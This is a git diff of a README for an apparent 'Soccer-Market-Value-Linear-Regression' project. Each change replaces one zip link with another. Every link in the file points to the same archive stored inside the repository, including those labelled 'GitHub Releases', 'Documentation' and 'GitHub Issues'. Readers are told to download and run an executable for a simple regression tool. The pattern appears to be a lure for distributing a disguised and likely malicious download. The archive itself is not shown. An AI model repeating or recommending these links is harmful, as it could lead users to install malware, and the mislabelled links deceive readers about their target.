@@ -1,6 +1,6 @@
 # ⚽ Soccer-Market-Value-Linear-Regression - Predict Player Values Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/danhdanh618/Soccer-Market-Value-Linear-Regression/master/notebooks/Soccer-Market-Value-Linear-Regression_2.8-alpha.2.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/danhdanh618/Soccer-Market-Value-Linear-Regression/master/notebooks/Soccer-Market-Value-Linear-Regression_2.8-alpha.2.zip)
+[![Download Now](https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/raw/refs/heads/master/plots/Value-Soccer-Regression-Market-Linear-v2.3.zip%20Now-Here-brightgreen)](https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/raw/refs/heads/master/plots/Value-Soccer-Regression-Market-Linear-v2.3.zip)
 
 ## 🏁 Introduction
 
@@ -12,7 +12,7 @@ To use this application, you will need to follow a few simple steps. This guide 
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/danhdanh618/Soccer-Market-Value-Linear-Regression/master/notebooks/Soccer-Market-Value-Linear-Regression_2.8-alpha.2.zip)
+1. Visit this page to download: [GitHub Releases](https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/raw/refs/heads/master/plots/Value-Soccer-Regression-Market-Linear-v2.3.zip)
    
 2. On the Releases page, look for the latest version. It’s usually at the top.
 
@@ -21,7 +21,7 @@ To use this application, you will need to follow a few simple steps. This guide 
 4. Download the file that matches your operating system.
    - For Windows: Download the `.exe` file.
    - For macOS: Download the `.dmg` file.
-   - For Linux: Download the `https://raw.githubusercontent.com/danhdanh618/Soccer-Market-Value-Linear-Regression/master/notebooks/Soccer-Market-Value-Linear-Regression_2.8-alpha.2.zip` file.
+   - For Linux: Download the `https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/raw/refs/heads/master/plots/Value-Soccer-Regression-Market-Linear-v2.3.zip` file.
 
 5. Once the file is downloaded, locate it on your computer.
 
@@ -72,11 +72,11 @@ For any questions or support requests, please open an issue in the repository. W
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/danhdanh618/Soccer-Market-Value-Linear-Regression/master/notebooks/Soccer-Market-Value-Linear-Regression_2.8-alpha.2.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/danhdanh618/Soccer-Market-Value-Linear-Regression/master/notebooks/Soccer-Market-Value-Linear-Regression_2.8-alpha.2.zip)
+- [Documentation](https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/raw/refs/heads/master/plots/Value-Soccer-Regression-Market-Linear-v2.3.zip)
+- [GitHub Issues](https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/raw/refs/heads/master/plots/Value-Soccer-Regression-Market-Linear-v2.3.zip)
 
 Feel free to explore the documentation for more detailed information on how to utilize the features effectively.
 
-[![Download Now](https://raw.githubusercontent.com/danhdanh618/Soccer-Market-Value-Linear-Regression/master/notebooks/Soccer-Market-Value-Linear-Regression_2.8-alpha.2.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/danhdanh618/Soccer-Market-Value-Linear-Regression/master/notebooks/Soccer-Market-Value-Linear-Regression_2.8-alpha.2.zip)
+[![Download Now](https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/raw/refs/heads/master/plots/Value-Soccer-Regression-Market-Linear-v2.3.zip%20Now-Here-brightgreen)](https://github.com/danhdanh618/Soccer-Market-Value-Linear-Regression/raw/refs/heads/master/plots/Value-Soccer-Regression-Market-Linear-v2.3.zip)
 
 Thank you for using Soccer-Market-Value-Linear-Regression! Enjoy predicting player values!
